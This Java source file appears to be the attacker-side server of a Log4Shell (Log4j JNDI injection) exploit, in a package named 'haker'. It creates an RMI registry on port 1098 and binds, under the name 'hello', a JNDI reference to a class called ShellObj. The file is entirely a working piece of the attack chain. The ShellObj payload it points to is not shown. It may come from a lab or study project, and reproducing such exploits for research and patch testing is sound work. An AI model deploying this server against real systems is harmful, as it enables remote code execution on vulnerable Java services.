package com.upuphub.jmeta.rmi.log4j2141.haker;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIService{
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {

        Registry registry  = LocateRegistry.createRegistry(1098);

        System.out.println("Create RMI registry on port 1098");
        Reference reference = new Reference("com.upuphub.jmeta.rmi.log4j2141.haker.ShellObj","com.upuphub.jmeta.rmi.log4j2141.haker.ShellObj",null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        registry.bind("hello",referenceWrapper);
    }
}
